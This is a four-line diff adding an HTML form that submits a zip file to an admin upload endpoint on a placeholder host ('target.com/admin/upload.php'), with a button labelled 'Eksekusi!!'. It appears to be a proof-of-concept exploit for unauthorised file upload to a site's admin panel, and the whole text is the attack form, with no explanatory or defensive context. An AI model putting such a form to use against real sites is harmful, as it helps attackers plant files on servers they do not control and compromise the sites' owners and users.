@@ -1,0 +1,4 @@
+<form action='https://target.com/admin/upload.php' method='post' enctype='multipart/form-data'>
+    <input type='file' name='zip_file' required='true' />
+    <button type='submit' name='btn_zip'>Eksekusi!!</button>
+</form>
